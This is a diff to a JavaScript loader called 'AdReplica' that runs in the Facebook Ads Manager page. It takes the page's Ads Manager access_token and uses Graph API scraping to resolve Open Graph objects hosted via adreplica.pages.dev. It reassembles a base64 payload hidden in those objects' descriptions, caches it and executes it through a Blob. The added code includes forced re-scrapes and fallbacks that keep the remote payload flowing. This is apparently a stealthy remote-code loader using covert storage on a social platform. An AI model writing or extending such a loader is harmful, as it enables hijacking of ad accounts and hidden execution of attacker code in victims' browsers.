@@ -3,7 +3,7 @@
 
   const loaderConfig = Object.assign({
     app: "AdReplica",
-    manifestOgObjectId: "36372667002332356",
+    manifestUrl: "https://adreplica.pages.dev/adreplica/latest/manifest.html",
     cacheKey: "adreplica.loader.cache.v1",
     timeoutMs: 45000,
   }, config || {});
@@ -37,8 +37,11 @@
     }
     return new TextDecoder().decode(bytes);
   };
-  const fetchJson = async (url) => {
-    const response = await withTimeout(fetch(url, { credentials: "include", cache: "no-store" }), url);
+  const fetchJson = async (url, init = {}) => {
+    const response = await withTimeout(fetch(url, Object.assign({
+      credentials: "include",
+      cache: "no-store",
+    }, init)), url);
     const text = await response.text();
     if (!response.ok) {
       throw new Error(`${response.status} ${text.slice(0, 200)}`);
@@ -104,20 +107,47 @@
       console.warn(`[${loaderConfig.app} loader] Payload loaded, but cache write failed.`, error);
     }
   };
+  const getGraphUrls = (accessToken) => {
+    const encoded = encodeURIComponent(accessToken);
+    return {
+      objectById: (id) => `https://adsmanager-graph.facebook.com/v23.0/${encodeURIComponent(id)}?fields=title,description,updated_time&access_token=${encoded}`,
+      scrapeByUrl: (url) => `https://graph.facebook.com/?id=${encodeURIComponent(url)}&scrape=true&access_token=${encoded}`,
+      ogByUrl: (url) => `https://graph.facebook.com/?id=${encodeURIComponent(url)}&fields=og_object&access_token=${encoded}`,
+    };
+  };
   const fetchOgObject = async (id) => {
     if (!id) {
-      throw new Error("No manifest OG object ID configured.");
+      throw new Error("No OG object ID configured.");
     }
     const accessToken = getAdsManagerAccessToken();
     if (!accessToken) {
       throw new Error("Cannot find Ads Manager access_token in current page runtime.");
     }
-    return fetchJson(
-      `https://adsmanager-graph.facebook.com/v23.0/${encodeURIComponent(id)}?fields=title,description,updated_time&access_token=${encodeURIComponent(accessToken)}`,
-    );
+    const graphUrls = getGraphUrls(accessToken);
+    return fetchJson(graphUrls.objectById(id));
   };
-  const fetchManifest = async () => {
-    const object = await fetchOgObject(loaderConfig.manifestOgObjectId);
+  const resolveOgObjectIdByUrl = async (url, options = {}) => {
+    if (!url) {
+      throw new Error("No manifest URL configured.");
+    }
+    const accessToken = getAdsManagerAccessToken();
+    if (!accessToken) {
+      throw new Error("Cannot find Ads Manager access_token in current page runtime.");
+    }
+    const graphUrls = getGraphUrls(accessToken);
+    if (options.forceRefresh) {
+      await fetchJson(graphUrls.scrapeByUrl(url), { method: "POST" });
+    }
+    const resolved = await fetchJson(graphUrls.ogByUrl(url));
+    const ogObjectId = resolved?.og_object?.id;
+    if (!ogObjectId) {
+      throw new Error(`Could not resolve current OG object for ${url}`);
+    }
+    return ogObjectId;
+  };
+  const fetchManifest = async (options = {}) => {
+    const manifestOgObjectId = await resolveOgObjectIdByUrl(loaderConfig.manifestUrl, options);
+    const object = await fetchOgObject(manifestOgObjectId);
     const manifest = JSON.parse(decodeBase64Utf8(object?.description || ""));
     if (manifest?.app !== loaderConfig.app || !manifest?.version || !manifest?.payload?.sha256) {
       throw new Error("Manifest is malformed or belongs to another app.");
@@ -125,13 +155,21 @@
     if (!Array.isArray(manifest.chunks) || !manifest.chunks.length) {
       throw new Error("Manifest does not contain payload chunks.");
     }
+    manifest._resolvedManifestOgObjectId = manifestOgObjectId;
     return manifest;
   };
-  const fetchOgPayload = async (manifest) => {
-    const ids = manifest.chunks.map((chunk) => chunk.ogObjectId).filter(Boolean);
-    if (ids.length !== manifest.chunks.length) {
-      throw new Error("Manifest has chunks without OG object IDs.");
+  const resolveChunkOgObjectId = async (chunk, options = {}) => {
+    const chunkUrl = chunk?.latestUrl || chunk?.url || "";
+    if (chunkUrl) {
+      return resolveOgObjectIdByUrl(chunkUrl, options);
     }
+    if (chunk?.ogObjectId) {
+      return chunk.ogObjectId;
+    }
+    throw new Error(`Chunk ${chunk?.index || "?"} has neither URL nor OG object ID.`);
+  };
+  const fetchOgPayload = async (manifest, options = {}) => {
+    const ids = await Promise.all(manifest.chunks.map((chunk) => resolveChunkOgObjectId(chunk, options)));
     const chunks = await Promise.all(ids.map((id) => fetchOgObject(id)));
     const encoded = chunks.map((chunk) => chunk?.description || "").join("");
     if (!encoded) {
@@ -163,11 +201,36 @@
       window[guardKey].source = "cache";
       return { source: cached.source, build: cached.version };
     }
-    const source = await fetchOgPayload(manifest);
-    writeCache(manifest, source);
-    log(`downloaded and cached ${manifest.version}`);
-    window[guardKey].source = "remote";
-    return { source, build: manifest.version };
+    try {
+      const source = await fetchOgPayload(manifest);
+      writeCache(manifest, source);
+      log(`downloaded and cached ${manifest.version}`);
+      window[guardKey].source = "remote";
+      return { source, build: manifest.version };
+    } catch (error) {
+      console.warn(`[${loaderConfig.app} loader] Remote payload fetch failed, forcing OG refresh.`, error);
+      try {
+        manifest = await fetchManifest({ forceRefresh: true });
+        window[guardKey].remoteVersion = manifest.version;
+        if (cached && cached.version === manifest.version && cached.sha256 === manifest.payload.sha256) {
+          log(`using cached ${cached.version} after forced manifest refresh`);
+          window[guardKey].source = "cache-after-refresh";
+          return { source: cached.source, build: cached.version };
+        }
+        const source = await fetchOgPayload(manifest, { forceRefresh: true });
+        writeCache(manifest, source);
+        log(`downloaded and cached ${manifest.version} after forced OG refresh`);
+        window[guardKey].source = "remote-refreshed";
+        return { source, build: manifest.version };
+      } catch (refreshError) {
+        if (cached) {
+          log(`remote payload unavailable, using cached ${cached.version}`);
+          window[guardKey].source = "cache-remote-failed";
+          return { source: cached.source, build: cached.version };
+        }
+        throw refreshError;
+      }
+    }
   };
   const executePayload = (source, build) => new Promise((resolve, reject) => {
     const blob = new Blob([
